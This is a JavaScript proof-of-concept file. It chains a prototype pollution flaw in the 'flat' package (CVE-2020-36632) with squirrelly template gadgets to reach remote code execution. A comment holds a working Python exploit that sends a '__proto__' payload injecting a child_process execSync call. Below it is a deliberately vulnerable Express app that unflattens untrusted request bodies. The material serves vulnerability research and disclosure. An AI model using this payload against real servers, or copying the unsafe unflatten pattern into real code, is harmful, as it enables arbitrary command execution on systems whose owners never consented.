/**
 * Here is the POC for prototype pollution gadgets in squirrellyjs@8.0.8
 * 
 * flag@5.0.0 contains CVE-2020-36632 which is a prototype pollution vulnerability
 * squirrellyjs@8.0.8 contains the gadgets that lead to RCE
 * 
 * exp:
 * 
  #!/usr/bin/env python3  
  import requests

  headers = {"content-type": "application/json"}
  exp_object = {
      "__proto__.settings": {
          'view options':{
        'defaultFilter': "e')); process.mainModule.require('child_process').execSync('touch flag');return tR;}}, params:[it.kids]})\n//",
      }
    }
  }

  requests.post('http://localhost:3000/login', json=exp_object, headers=headers)
  requests.get('http://localhost:3000/')
 * 
 * 
 */
const express = require('express');
var sqrl = require('squirrelly')
const { unflatten } = require('flat'); // flag@5.0.0 contains CVE-2020-36632
const bodyParser = require('body-parser');
const app = express()
const path = require('path')
const port = 3000

templatePath = path.join(__dirname+'/views/', 'each.sqrl');
/**
 *  Inside the each.sqrl file:
 *  
    The Daugherty's have 8 kids. Their names are:
    {{@each (it.kids) => val, index}}
    {{@if(index < it.kids.length - 1 _}}
    {{val}},
    {{#else _}}
    and {{val}}
    {{/if}}
    {{/each}}
 */

app.use(bodyParser.json());
app.engine('sqrl', sqrl.renderFile)

app.get('/', (req, res) => {
  /** where code execution has been triggered */
  res.render(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });
})

app.post('/login',(req,res)=> {
  /** where prototype pollution take place */
  let object = unflatten(req.body);
  console.log(`User: ${object.username} login!`);
  res.send("Login success!");
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
